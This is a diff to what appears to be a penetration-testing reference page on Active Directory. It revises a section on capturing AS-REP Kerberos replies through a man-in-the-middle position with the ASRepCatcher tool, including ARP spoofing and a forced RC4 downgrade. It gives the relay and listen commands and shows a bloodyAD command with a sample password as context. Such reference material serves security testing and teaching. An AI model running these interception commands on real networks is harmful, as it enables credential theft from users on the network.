@@ -98,19 +98,19 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 {% endcode %}
 
-## ASreproast without credentials
-Without the knowledge of users who do not require Kerberos pre-authentication. An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network.<br>
-[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) allows us to do so. Moreover, the tool <ins>forces client workstations to use RC4</ins> by altering the Kerberos negotiation.
+## ASREProast without credentials
+An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network <ins>without relying on Kerberos pre-authentication being disabled.</ins> It therefore works for all users on the VLAN.<br>
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool <ins>forces client workstations to use RC4</ins> by altering the Kerberos negotiation.
 
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
-ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
+ASRepCatcher relay -dc $DC_IP
 
 # Disabling ARP spoofing, the mitm position must be obtained differently
-ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+ASRepCatcher relay -dc $DC_IP --disable-spoofing
 
 # Passive listening of AS-REP packets, no packet alteration
-ASrepCatcher.py listen
+ASrepCatcher listen
 ```
 
 
